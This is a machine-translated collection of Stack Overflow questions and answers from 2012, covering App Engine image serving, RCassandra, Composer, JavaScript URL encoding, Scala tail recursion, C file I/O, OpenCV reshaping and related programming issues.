e4\xce\xf0\xff\x0b\xe0.\x84\x8d&\xa5\x98\x85d\xf0\xcc\x9b\xbd\xe9\xd4d\xfb\x92U\xeb\x7f\x17\xaeo\xc8AD\xf1\xad\xc8]"\xba\xef\xde\xbf\x00E\x15c\xc0\xf90\xc3\xa2\x00\x00\x00\x00IEND\xaeB`\x82' (<class 'google.appengine.api.datastore_types.Blob'>) 
```

请指导我如何进一步进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:31:34.713

你需要做两件事。首先，您需要更改您的 HTML，以便`src`标记的`img`包含由您的应用程序提供的 URL。其次，您需要实现一个处理程序来为 URL 提供服务。

假设您的应用程序将使用如下 URL 提供存储的图像：`/image/15`其中 15 是`id`实体的`imgstore`。您需要添加一条路线：

```
routes=[
        (r'/image/(\d+)', ImageHandler),
        (r'/', MainHandler),
        ]
app = webapp2.WSGIApplication(routes=routes,debug=True) 
```

然后你需要添加一个新的 RequestHandler 类：

```
class ImageHandler(webapp2.RequestHandler):
    def get(self, image_id):
        requestedImage = imgstore.get_by_id(int(image_id))
        if requestedImage is not None:
            self.response.out.write(requestedImage.image)
        else:
            # return a default image when we can't located the
            # one that was requested? 
```

新路由包括一个数字捕获——`(\d+)`将作为参数传递给请求处理程序。然后我们可以使用该 id 直接从数据存储中获取图像实体；它比使用查询快得多。

那么，我们从哪里得到 id 呢？数据存储中的每个实体都会自动分配一个整数 ID，除非您在存储它时为其指定一个 ID 或名称。

您需要做的最后一件事是提供一种简单的方法，将用于为您的图像提供服务的 URL 嵌入到包含`img`标签的模板中。向您的 imgstore 类添加一个方法：

```
class imgstore(db.Model):
    name=db.StringProperty(multiline=True, default='')
    image=db.BlobProperty()

    def url_for(self):
        return "/image/%d" % self.id 
```

现在您可以更改模板以使用新方法：

```
<img src="{{lis.url_for}}"> 
```

# r - 使用 RCassandra 将 R 连接到 Cassandra

> ID：11651167
> 
> 赞同：1
> 
> 时间：2012-07-25T13:44:40.010
> 
> 标签：r, cassandra

我有一个 Cassandra 实例在我的本地主机上运行。对于这个例子，我使用了 conf\cassandra.yaml 中提供的默认配置

我尝试使用 RCassandra 包将 R 连接到 Cassandra。

基本上，我刚刚在 R 中安装了 RCassandra 包并尝试连接。

```
library("RCassandra")
RC.connect('localhost','9160')
RC.connect('127.0.0.1','9160') 
```

这些都不起作用。这是我得到的错误：

```
Error in RC.connect("localhost", port = "9160") : 
  cannot connect to locahost:9160 
```

使用具有相同参数的 Cassandra-cli 可以工作。你能帮忙吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-02-17T14:27:06.627

`start_rpc: true`在 cassandra.yaml 文件中设置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-26T11:13:39.593

无法修复它，但找到了让它工作的方法：启动一个 jdbc 连接，然后启动 RCassandra

```
 #Load RJDBC

library(RJDBC)

#Load in the Cassandra-JDBC diver
cassdrv <- JDBC("org.apache.cassandra.cql.jdbc.CassandraDriver",
        list.files("C://Users//aab_ITSolutions//apache-cassandra-1.0.10//lib",pattern="jar$",full.names=T))

#Connect to Cassandra node and Keyspace
casscon <- dbConnect(cassdrv, "jdbc:cassandra://localhost:9160/DEMO")

#Query timeseries data
res <- dbGetQuery(casscon, "select * from StockHist limit 10")

library("RCassandra")

connx = RC.connect('localhost',9160) 
```

# symfony-2.1 - 使用 composer 安装第三方 symfony 包

> ID：11651170
> 
> 赞同：0
> 
> 时间：2012-07-25T13:44:44.007
> 
> 标签：symfony-2.1, composer-php

行。作曲家似乎很棒。

但是添加新包的 deps 方法更复杂。我还是不明白。

请有人给我一个关于如何将第三方捆绑包添加到`symfony2 2.1.0-BETA4`安装中的完整示例。

我要添加的包是[这个](https://github.com/doctrine/data-fixtures/)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:56:26.307

基本上：

```
{
    "require": {
        "doctrine/doctrine-fixtures-bundle": "dev-master"
} 
```

关于[do](http://symfony.com/doc/master/bundles/DoctrineFixturesBundle/index.html) c，应该是这样设置的。

如果你**只**想要这个捆绑包（而不是`DoctrineFixturesBundle`）：

```
{
    "require": {
        "doctrine/data-fixtures": "dev-master"
} 
```

# php - 转义 GET 参数

> ID：11651173
> 
> 赞同：-1
> 
> 时间：2012-07-25T13:45:08.903
> 
> 标签：php, javascript, html, ajax

我`<form>`的页面上有一个`<textarea>`，我想使用 Ajax 发送在其中输入的文本。文本转到 PHP 页面，我将其插入 SQL 数据库。

我面临的问题是，每当我写`+`或`&`在 中`<textarea>`，JavaScript 将它们视为 URL 中的特殊字符。我怎样才能逃脱他们？

```
function getMessageResponse() {
    var xmlHttp;

    try {
        // Firefox, Opera 8.0+, Safari
        xmlHttp = new XMLHttpRequest();
    } catch(e) {
        // Internet Explorer
        try {
            xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
        } catch(e) {
            try {
                xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
            } catch(e) {
                alert("Your browser does not support AJAX!");
                return false;
            }
        }
    }

    xmlHttp.onreadystatechange = function() {
        if(xmlHttp.readyState == 4) {
            document.getElementById('response').innerHTML = xmlHttp.responseText;
            document.myform.post.value = '';
            retrieve();
        }
    }

    var url = "wall4.php";
    url = url+"?post=" + document.myform.post.value; 

    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:49:30.397

[编码](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/encodeURIComponent)您的参数：

```
url = url + "?post=" + encodeURIComponent(document.myform.post.value); 
```

# java - Eclipse 调试器中变量条目旁边的 id=xxx 是什么

> ID：11651174
> 
> 赞同：30
> 
> 时间：2012-07-25T13:45:13.537
> 
> 标签：java, eclipse, debugging

`id=xxx`Eclipse 调试器中的变量条目旁边是什么> 我知道它似乎可以唯一地标识对象。但我不能说的是它与对象的关系是什么。

![截屏](../Images/0aec7398847a71c0438767877cf56aaa.png)

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-07-25T14:06:59.820

ID号是由eclipse调试器任意分配的，它只是一个线索，可以帮助您在调试时轻松确定两个变量是否指向同一个对象......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T14:17:15.830

从[http://www.manning-sandbox.com/thread.jspa?threadID=11426](http://www.manning-sandbox.com/thread.jspa?threadID=11426)看起来它是 JPDA ObjectReference.uniqueId

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-25T14:07:28.880

该`id`字段唯一地标识一个对象。

# javascript - 在 iOS 上移动 html 元素位置缓慢

> ID：11651177
> 
> 赞同：0
> 
> 时间：2012-07-25T13:45:44.527
> 
> 标签：javascript, jquery, css, ios, html

当我在 CSS 中修改多个 html 元素的位置时，我在 iOS html5 webapp 上遇到了一个巨大的性能问题。我还想手动移动我的元素。我不想使用 CSS 转换，因为无法停止动画（我们正在制作一个高度响应的游戏）。

我的示例在 Android 上的桌面浏览器（chrome、firefox 等）上运行良好。但它在 iPad 2 和 iPhone 4S（均运行 iOS 5.1）上非常慢。在 Phonegap 应用程序中运行 html5 代码比直接在浏览器中运行要好，但仍然很慢。

你有什么建议可以改进的？
[可编辑示例](http://jsfiddle.net/JLGYY/4/)
[全屏示例](http://jsfiddle.net/JLGYY/4/embedded/result/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:41:26.753

首先，如果您想要一些不慢的东西，请尽可能避免所有 jQuery 调用。

这是我将如何重写（非常快）你的代码：

```
// shim layer with setTimeout fallback
window.requestAnimFrame = (function(){
  return  window.requestAnimationFrame       || 
          window.webkitRequestAnimationFrame || 
          window.mozRequestAnimationFrame    || 
          window.oRequestAnimationFrame      || 
          window.msRequestAnimationFrame     || 
          function( callback ){
            window.setTimeout(callback, 1000 / 60);
          };
})();

var canvas = document.getElementById('canvas-test');
    canvas.height = 500;
    canvas.width = 500;
    var context = canvas.getContext('2d');

    // in this example, the fillstyle is always the same. no need to change it at every loop
    context.fillStyle = "#FF0000";

var balls = [];
var ballcanvas = [];
var ballctx = [];

// create 30 balls in canvases
var eDivBody = document.getElementById('divbody');
for (var i = 0; i < 30; i++){
    balls[i] = {
        x : 250,
        y : 100 + i * 2,
        dx : 3, // direction
    };

    // create the canvas
    var eBall = document.createElement('canvas');
    eBall.id = 'ballcanvas' + i;
    eBall.width = 75;
    eBall.height = 75;
    eDivBody.appendChild(eBall);

    // some css
    // no need for jQuery
    eBall.style.position = "absolute";
    eBall.style.left = balls[i].x + "px";
    eBall.style.top = balls[i].y + "px";
    eBall.style.backgroundColor = "#000000";

    // associate the element to the ball, no need to go threw the DOM after
balls[i].element = eBall;
}

var ball_test = {
    x : 250,
    y : 300,
    dx : 3 // direction
};

function loop(ball_test, balls, canvas, context, ballcanvas, ballctx){
    //change of direction on the sides
    if (ball_test.x > 400 || ball_test.x < 100)
        ball_test.dx *= -1;
    // movement
    ball_test.x += ball_test.dx;

    // the same for balls in canvases
    // never use array.legth in a loop condition. put it in a variable then compare. 
    for (var i = 0, j = balls.length; i < j; i++){
        // balls are following the test ball, no need to re-check the bounds
        // we take the test ball direction
        balls[i].dx =  ball_test.dx;

        //movement   
        balls[i].x += balls[i].dx;
        // change left style - No need for jQuery
        balls[i].element.style.left = balls[i].x + "px";
    }

    // display ball_test
    displayBallTest(ball_test, canvas, context);

    // Prefer the use of requestAnimationFrame
    requestAnimFrame(function(){
        loop(ball_test, balls, canvas, context, ballcanvas, ballctx);
    });
};

// no need to recalculate Math.PI * 2 for every loop.
// do it just the first time then use the value
var pi2 = Math.PI * 2;

function displayBallTest(ball, canvas, context){
    // clear canvas    
    // you don't need to clear all the canvas, just the zone where you now the ball is.
    // must need some calculation to be the most efficient possible
    context.clearRect(ball.x - 50 , ball.y  - 50, 100, 100);

    context.beginPath();
    context.arc(ball.x, ball.y, 40, 0, pi2 );
    context.fill();
};

// start main loop
loop(ball_test, balls, canvas, context, ballcanvas, ballctx); 
```

我评论了代码，但这是我所做的：

*   完全避免使用 jQuery。不需要，除非您选择不将脚本放在内容末尾
*   尽可能使用 requestAnimationFrame
*   避免重新计算或重置全局值（Math.PI*2，context.fillStyle ...）
*   避免使用 .length if for 循环条件

但我认为您的问题来自您想要移动 30 个画布元素而不是将它们的内容绘制到主画布中的事实。众所周知，iOS 在您使用 Canvas 绘图时速度很快。对我来说，如果您选择在主画布上绘制而不是移动 DOM 元素，您的性能问题将会得到解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:50:53.773

您可以做的一件显而易见的事情是缓存您的选择器，而不是每次都执行它：

```
 // some css            
    $('#ballcanvas' + i).css("position", "absolute");
    $('#ballcanvas' + i).css("left", balls[i].x + "px");
    $('#ballcanvas' + i).css("top", balls[i].y + "px");
    $('#ballcanvas' + i).css("background-color", "#000000"); 
```

应该是这样的：

```
var thisBall = $('#ballcanvas' + i)
thisBall.css("position", "absolute");
... rest of your code .... 
```

`document.getElementById`旁白：当您已经拥有 Jquery 时，为什么还要使用`$`.

# scala - 尾递归 cons 运算符 Scala

> ID：11651178
> 
> 赞同：0
> 
> 时间：2012-07-25T13:45:46.093
> 
> 标签：scala, tail

如果函数中的最后一条语句是 func(x,tailList)：

```
 def func(x:Int):List[Int]...
    case head :: tailList => head :: func(x,tailList) 
```

将此函数转换为尾递归需要将累加器添加为第三个参数（并在 func() 中添加本地函数以保持其干净）。

```
 insertTail(x,tailList,head::acc) 
```

似乎无法正常工作。“acc”不应该保持正在进行的计算吗？

我是否在这里遗漏了一些东西以使其与累加器进行尾递归工作？

添加更完整的示例

```
def funcTailTest(x:Int,xs:List[Int]):List[Int] =  {
@tailrec
def inner(x:Int,xs:List[Int],acc:List[Int]) : List[Int] = xs match {

  case head::tailList => {
    inner(x,tailList,head::acc)
  }
}
inner(x,xs,Nil)

} 
```

基本上 head 应该被添加到 inner() 函数的输出中，所以如果没有尝试使其尾部递归最后一个语句在一个案例中看起来

```
head::inner(x,tailList) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:16:51.413

假设 reverse 也是尾递归实现的（肯定可以），以下是尾递归追加：

```
def append[T](y: T, xs: List[T]): List[T] = {
  @tailrec
  def appendAcc[T](y: T, xs: List[T], acc: List[T]): List[T] = xs match {
    case Nil => y :: acc
    case x :: xs => appendAcc(y, xs, x :: acc)
  }

  appendAcc(y, xs, Nil).reverse
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-13T10:31:38.223

以下是使用 cons 运算符实现尾递归的 scala 函数

```
def reverseUtility(ele: List[Int], res: List[Int]):List[Int] ={
  ele match {
  case Nil => Nil
  case x :: Nil => x :: res
  case x :: y => reverseUtility(y, (x::res))
}} 
```

传递一个列表`Int`和一个空列表`res(result)`作为函数的参数。该函数的时间复杂度为 O(N)

# php - 如何将此错误消息更改为 php 中弹出的警报？

> ID：11651180
> 
> 赞同：0
> 
> 时间：2012-07-25T13:45:53.690
> 
> 标签：php

我想将此代码修改为弹出警报。目前，此代码仅产生错误消息。我想修改它，所以当课程发生冲突时，会出现弹出窗口

```
 if($clash_courses==1)
{
    $error_msg .= 'Course ';
    $c = 0;
    foreach($course_id as $id){
        $c++;
        $error_msg .= $id;
        if($c<count($course_id))
        $error_msg .= ' and ';
    }

    $error_msg .= ' have clashed.';

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:48:19.557

## PHP 在服务器端。

您想要在客户端（浏览器）上作为“弹出窗口”的任何内容，都需要一些 javascript 或 css 魔法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:48:57.120

```
 if($clash_courses==1)
{
    echo '<script type = "text/javascript">';
    $error_msg .= 'Course ';
    $c = 0;
    foreach($course_id as $id){
        $c++;
        $error_msg .= $id;
        if($c<count($course_id))
        $error_msg .= ' and ';
    }

    $error_msg .= ' have clashed.';
    echo('alert("' . htmlspecialchars(str_replace('"', '\\"', $error_msg)) . '");</script>');

} 
```

不是最干净的解决方案，但它应该可以工作。另一种解决方案是通过 AJAX 访问此脚本，然后它可以将错误作为“错误对象”反馈给客户端，或者甚至只是客户端可以使用的简单消息`alert`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:51:10.900

以原始方式：

```
$error_msg .= ' have clashed.';
$popup="<script type='text/javascript'>
alert('"$.error_msg."');
</script>"; 
```

如果您在某些 html 中“回显” `$popup`，它将显示一个弹出警报。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:05:11.213

如果你想弹出你的消息，你可以这样做，`Javascript alertbox`但如果你想让它看起来很有吸引力，那么你可以使用[Twitter Bootstrap Modal](http://twitter.github.com/bootstrap/javascript.html#modals) ，它也会向你展示演示

# javascript - 在 HTML 中嵌入 Flash 对象时是否触发了 onLoad/onError 事件？

> ID：11651181
> 
> 赞同：0
> 
> 时间：2012-07-25T13:45:54.553
> 
> 标签：javascript, html, flash

我通过内联这样的 HTML 将 Flash 播放器嵌入到 HTML 中：

```
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0"
width="470" height="320">
<param name="movie" value="http://myserver.com/app.swf"></param>
<param name="FlashVars" value="src=http://myserver.com/mymovie.flv"></param>
<param name="allowscriptaccess" value="always"></param>
<embed src="http://myserver.com/strobe/StrobeMediaPlayback.swf"
    type="application/x-shockwave-flash"
    allowscriptaccess="always" width="470" height="320"
    FlashVars="src=http://myserver.com/mymovie.flv">
</embed>
</object> 
```

我想收到回调 onLoad 或 onError 通知 SWF 应用程序是否已正确下载和初始化。有可能吗？flash 插件是否会为 javascript 公开此类事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:41:34.690

如果您使用[SWFObject](http://code.google.com/p/swfobject/wiki/api)嵌入 SWF ，它的`embedSWF()`方法有一个可选的回调参数，您可以使用该参数来了解嵌入是成功完成还是失败。

这是方法签名：

```
swfobject.embedSWF(swfUrlStr, replaceElemIdStr, widthStr, heightStr, swfVersionStr, xiSwfUrlStr, flashvarsObj, parObj, attObj, callbackFn) 
```

我从未见过任何其他方式来获取此信息，但我总是使用 SWFObject :)

# javascript - doPostback 然后导航到另一个页面

> ID：11651183
> 
> 赞同：0
> 
> 时间：2012-07-25T13:46:04.060
> 
> 标签：javascript, dopostback

我试图从 JavaScript 中调用 __doPostBack，然后导航到另一个页面。我的脚本是：

```
$(document).ready(function() {  
   $("a.change-link").click(function(){          
             __doPostBack("","");  
             location.href='pageToGoTo';                                                                                            
   });

}); 
```

`location.href='pageToGoTo'`回帖后代码没有到达行。

反正有没有实现这个功能？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:49:58.463

`location.href='pageToGoTo';`将永远不会执行，因为您将整个表单发布回服务器。您需要在服务器端重定向请求。

```
Response.Redirect = "pageToGoTo"; 
```

# python - 如何使用python从文件中复制特定数据？

> ID：11651188
> 
> 赞同：2
> 
> 时间：2012-07-25T13:46:19.087
> 
> 标签：python

我有一些大数据文件，我想复制每一行的某些数据，基本上是一个 ID 代码。ID 代码的一侧有一个`|`，另一侧有一个空格。我想知道是否可以只提取ID。我还有两个数据文件，一个每行有 4 个 ID 代码，另一个每行有 23 个。

目前我正在考虑从数据文件中复制每一行，然后从彼此中减去字符串以获得所需的 ID 代码，但肯定有更简单的方法！帮助？

这是我正在使用的数据文件中的一行示例

```
cluster8032:  WoodR1|Wood_4286 Q8R1|EIK58010 F113|AEV64487.1 NFM421|PSEBR_a4327 
```

从这一行开始，我想在单独的行上输出

```
Wood_4286
EIK58010
AEV644870.1
PSEBR_a4327 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T13:57:19.677

使用正则表达式模块来完成这样的任务。以下代码向您展示了如何从字符串中提取 ID（适用于任意数量的 ID，只要它们的结构相同）。

```
import re
s = """cluster8032:  WoodR1|Wood_4286 Q8R1|EIK58010 F113|AEV64487.1 NFM421|PSEBR_a4327"""
results = re.findall('\|([^ ]*)',s) #list of ids that have been extracted from string
print('\n'.join(results)) #pretty output 
```

输出：

```
Wood_4286
EIK58010
AEV64487.1
PSEBR_a4327 
```

要将输出写入文件：

```
with open('out.txt', mode = 'w') as filehandle:
    filehandle.write('\n'.join(results)) 
```

有关详细信息，请参阅[正则表达式模块文档](http://docs.python.org/py3k/library/re.html?highlight=re#re)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:14:26.750

如果您的所有行都具有给定的格式，则简单的拆分就足够了：

```
#split by '|' and the result by space
ids = [x.split()[0] for x in line.split("|")[1:]] 
```

# c - 似乎无法让 fgetc 第二次读取文件

> ID：11651196
> 
> 赞同：0
> 
> 时间：2012-07-25T13:46:37.390
> 
> 标签：c, fgetc

我正在重新打开并读取一个文件 SORTED.txt，在它第一次使用后关闭它 - 复制另一个文件 UNSORTED.txt 的所有内容。从 UNSORTED.txt 复制后，我想计算我复制的行数（作为一个单独的过程，而不是在复制过程中）。fegtc() 似乎第二次没有指向文件的开头（SORTED.txt），因此行的值保持初始化为 0。此外，一般来说，我可以重新指向fgetc() 在没有考虑关闭和重新打开文件的情况下完成？

感谢任何帮助。

干杯!

```
 f = fopen("./TEXTFILES/UNSORTED.txt", "w");
  if (f == NULL){
      printf("ERROR opening file\n");
      return 100;
  }

  for (i=0; i<1000000; i++){
    fprintf(f, "%d\n", (23*rand()-rand()/13));
  }
  fclose(f);

  f = fopen("./TEXTFILES/UNSORTED.txt", "r");
  if (f == NULL){
    return 100;
  }
  s = fopen("./TEXTFILES/SORTED.txt", "w");
  if (s == NULL){
    return 101;
  }

  while(1){
    j = getc(f);
    if (j == EOF) break;
    fputc(j, s);
  }
  fclose(f);
  //Closed source file. Read number of lines in target file.
  fclose(s);
  s = fopen("./TEXTFILES/SORTED.txt", "w");
  j = 0;

  while(1){
    j = fgetc(s);
    if (j == EOF) break;
    if (j == '\n') lines++;
  }

  fclose(s);
  printf("\n%d\n", lines); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:52:56.683

您正在`"w"`（写入）模式下打开文件：

```
s = fopen("./TEXTFILES/SORTED.txt", "w"); 
```

但从中读取：

```
 j = fgetc(s); 
```

您可能打算以读取模式打开它：

```
s = fopen("./TEXTFILES/SORTED.txt", "r");
                                    ^^^ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:21:40.490

听起来你已经想通了！但是由于我努力将这个例子放在一起，我想我还是会发布它。

```
#include <stdio.h> 

int main()
{
    FILE * f;
    FILE * s;
    int i, j;
    int lines = 0;

    f = fopen("./TEXTFILES/UNSORTED.txt", "w+");
    if (f == NULL){
        printf("ERROR opening file\n");
        return 100;
    }

    for (i=0; i<1000000; i++){
        fprintf(f, "%d\n", (23*rand()-rand()/13));
    }

    s = fopen("./TEXTFILES/SORTED.txt", "w+");
    if (s == NULL){
        fclose(f); // cleanup and close UNSORTED.txt
        return 101;
    }

    // rewind UNSORTED.txt here for reading back
    rewind( f );

    while(1){
        j = getc(f);
        if (j == EOF) break;
        fputc(j, s);
    }

    // done with UNSORTED.txt. Close it.
    fclose(f);

    // rewind SORTED.txt here for reading back
    rewind( s );
    j = 0;

    while(1){
        j = fgetc(s);
        if (j == EOF) break;
        if (j == '\n') lines++;
    }

    fclose(s);

    printf("\n%d\n", lines);

    return 0;
} 
```

# c++ - boost::chrono::high_resolution_clock::now() 断言

> ID：11651198
> 
> 赞同：0
> 
> 时间：2012-07-25T13:46:51.740
> 
> 标签：c++, multithreading, boost

我正在使用`boost::chrono::high_resolution_clock::now();` ，有时会得到：

> Boost::Chrono - 内部错误。

我的应用程序是多线程的，所以有人知道该`now()`函数是否是线程安全的吗？

我查看了`now()`函数的实现，它使用了一个`static`变量，这可能意味着它不是线程安全的。

我的代码如下所示：

```
auto algTimer = boost::chrono::high_resolution_clock::now(); 
```

我得到的信息指向：

C:\boost\boost_1_48_0\boost\chrono\detail\inlined\win\chrono.hpp 第 44 行

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-22T06:08:36.763

也许有某种重入问题？我在 Windows 上与 Boost 1.55 有同样的错误，每次我检查断言同时发生在两个线程中。

不幸的是，有时 QueryPerformanceCounter 调用在 boost\chrono\detail\inlined\win\chrono.hpp 的第 42 行失败，这会导致断言错误。

```
if ( (nanosecs_per_tic <= 0.0L) ||
        (!boost::detail::winapi::QueryPerformanceCounter( &pcount )) )
{
  BOOST_ASSERT(0 && "Boost::Chrono - Internal Error");
  return steady_clock::time_point();
} 
```

此错误有一张 Boost 票，但活动不多。 [https://svn.boost.org/trac/boost/ticket/8006](https://svn.boost.org/trac/boost/ticket/8006)

我验证了 QueryPerformanceCounter 的参数是 QWord 对齐的，根据[需要](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644904%28v=vs.85%29.aspx)，所以这不是问题。

我有两个解决这个问题的建议。第一个建议是使用[另一个重载](http://www.boost.org/doc/libs/1_55_0/doc/html/chrono/reference.html#chrono.reference.cpp0x.system_clocks_hpp.steady_clock)for `now`，它接受 system::error_code 并且不断言。第二个建议是禁用断言，或者通过 BOOST_ENABLE_ASSERT_HANDLER 为 Boost 提供断言处理程序...参见[assert.hpp](http://www.boost.org/doc/libs/1_55_0/libs/utility/assert.html)。

# jquery - JQuery Mobile 像画廊一样在页面之间滑动

> ID：11651202
> 
> 赞同：2
> 
> 时间：2012-07-25T13:47:04.237
> 
> 标签：jquery, html, jquery-mobile, swipe

我的应用由不同的 HTML5 页面组成。我知道如何使用 JQuery Mobile 在它们之间滑动。但我想要一个水平进度条之类的东西。这样用户就知道可能有 10 页，而他是一个开始。

我知道这些画廊插件。但我不想刷图像。我想在没有任何按钮的情况下滑动整个页面。

我希望有人知道如何编写类似的代码或为我提供示例项目。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:24:11.520

[http://jsfiddle.net/yxzZf/4/](http://jsfiddle.net/yxzZf/4/)

我之前已经实现了一个 jquery 移动滑动，但它并不是那么顺利。如果您的页面正在回帖，那将不会那么好。我建议尝试这个链接。非常平滑的过渡。

[http://blogs.claritycon.com/blog/2011/07/building-a-touch-friendly-html5-site/](http://blogs.claritycon.com/blog/2011/07/building-a-touch-friendly-html5-site/) 包含示例代码。

这在 jQuery mobile 上会很困难。我会将这个示例代码包含在一个 jquery 移动页面中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-25T17:08:51.703

如果您使用本机转换功能，这将很容易实现，如下所示：

```
$('div.ui-page').live("swipeleft", function(){
   $.mobile.changePage( "target-page.html", {      
       transition: "slide", 
       reverse: false, 
       changeHash: false,
       reloadPage: true      
   });
 }); 
```

# c++ - 图像到点向量

> ID：11651205
> 
> 赞同：3
> 
> 时间：2012-07-25T13:47:08.250
> 
> 标签：c++, opencv

我正在尝试计算多通道图像补丁的协方差（使用[cv::calcCovarMatrix](http://opencv.itseez.com/modules/core/doc/operations_on_arrays.html#calccovarmatrix)），因此我可以反过来计算像素与该补丁的[马氏距离](https://en.wikipedia.org/wiki/Mahalanobis_distance)，我真的很难找到正确的选项来重塑矩阵转换成正确的格式。

例如，如果我的矩阵有 3 行、4 列和 2 个通道：

```
// Channel 1:
1 2 3 4
5 6 7 8
9 0 1 2

// Channel 2:
99 98 97 96
95 94 93 92
91 90 89 88 
```

我认为我需要将图像重塑为具有 3x4=12 行和 2 列（或其转置）的形状：

```
// Desired result:
1  2  3  4  5  6  7  8  9  0  1  2
99 98 97 96 95 94 93 92 91 90 89 88 
```

1.  这是 cv::calcCovarMatrix 的正确格式吗？
2.  .reshape() 需要什么参数来实现这一点？

代码中的一个例子：

```
#include <opencv2/opencv.hpp>
int main(int argc, char* argv[])
{
    // Construct channel 1
    cv::Mat_<float> channel1 = (cv::Mat_<float>(3, 4) << 1.0, 2.0, 3.0, 4.0,
                                                         5.0, 6.0, 7.0, 8.0,
                                                         9.0, 0.0, 1.0, 2.0);
    std::cout << "Channel 1: " << std::endl;
    std::cout << channel1 << std::endl;

    // Construct channel 2
    cv::Mat_<float> channel2 = (cv::Mat_<float>(3, 4) << 99.0, 98.0, 97.0, 96.0,
                                                         95.0, 94.0, 93.0, 92.0,
                                                         91.0, 90.0, 89.0, 88.0);
    std::cout << "Channel 2: " << std::endl;
    std::cout << channel2 << std::endl;

    // Merge together
    std::vector<cv::Mat> stack;
    cv::Mat merged;
    stack.push_back(channel1);
    stack.push_back(channel2);
    cv::merge(stack, merged);
    std::cout << "Merged:" <<std::endl;
    std::cout << merged << std::endl;

    // Reshape
    cv::Mat reshaped = merged.reshape(0,1).reshape(1); // <----Need help with this line
    std::cout << "Reshaped:" <<std::endl;
    std::cout << reshaped << std::endl;

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:57:40.307

未经测试，但查看文档和 calcCovarMatrix() 实现，您应该执行类似的操作

```
cv::Mat reshaped = merged.reshape(1,1); 
```

或者

```
cv::Mat reshaped = merged.reshape(1,3*4); 
```

似乎 calcCovarMatrix() 可以处理列矩阵和行矩阵。

您可以查看`opencv/modules/core/src/matmul.cpp`第 2097 行中的代码

# oop - 在值空间中允许多个“无值”值

> ID：11651207
> 
> 赞同：2
> 
> 时间：2012-07-25T13:47:15.500
> 
> 标签：oop, design-patterns, design-principles

我在我的所有域中使用字符串类型作为我的 Id 属性。例如：

```
public class Person {
    property string Id { get; set; }
    // ... more properties
} 
```

这里没有技巧。`null`代表一个“无价值”的值，当一个新的 Person 被创建并且在它被持久化之前，`Id`将保持`null`。

现在有一个讨论来增强“无值”空间并说`null`，空字符串和空白字符串都是“无值”值。

即检查实体是否是新的而不是做：`if (person.Id == null)`它将成为`if (string.IsNullOrWhiteSpace(person.Id))`

在我看来，这是一种气味或违反设计原则的行为，但我不知道是哪一种。

**问题：**这个决定违反了哪个（如果有的话）设计原则（决定允许不仅仅是`null`代表无价值的价值）？

（我认为它应该类似于奥卡姆剃刀原理或熵或 KISS，我只是不确定）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:54:26.650

我要冒昧地说，将两者定义`null`为`""`应用程序的空字符串不违反任何设计原则，也不是代码异味。您只需要为您的目的清楚地定义字段的语义，并且您已经这样做了（即，在您的应用程序中，但`null`意味着`""`“没有价值”）。

您应该进行测试以确保 和 的行为都是正确`null`的`""`。

这并不是说您也不能决定将所有空字符串强制为空。这是一个同样有效的决定。您需要进行测试以验证在您设置“无值”的所有情况下，实际值为空。如果您的持久层期望 null 并且只有 null 表示没有值，您可能希望采用这种方式。

所以，在这种情况下，没有错误的决定，只有决定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-08T00:24:59.763

它确实违反了 KISS 原则。如果除了 null 之外没有特殊需要处理空字符串，那为什么要这样做呢？所有操作现在必须检查两个值，而不是一个。在探索 DB 时，一个简单的 SELECT 来查找“NULL”记录变得不那么琐碎了，没有充分的理由。

另一个违反的原则是最小意外原则——通常人们只期望 NULL 值来表示 NULL 对象。带有两个特殊值的设计不太明显，也不太“可读”。

如果应该在这些“第二类特殊对象”后面隐藏更多内容，那么应该明确说明。否则，处理空字符串输入应该很简单，并将其存储为 NULL 以与系统的其余部分保持一致。

编辑：

我还在 Bob Martin 的书[清洁代码](https://rads.stackoverflow.com/amzn/click/com/0132350882)中找到了另一个“原则” ——“每个概念一个词”，这与这个案例有某种关系。空字符串和 NULL 是用于一个概念的两个“词”，因此它们显然违反了本指南。

# xml - xpath-functions 不识别外部 Java 类

> ID：11651209
> 
> 赞同：2
> 
> 时间：2012-07-25T13:47:40.663
> 
> 标签：xml, xslt

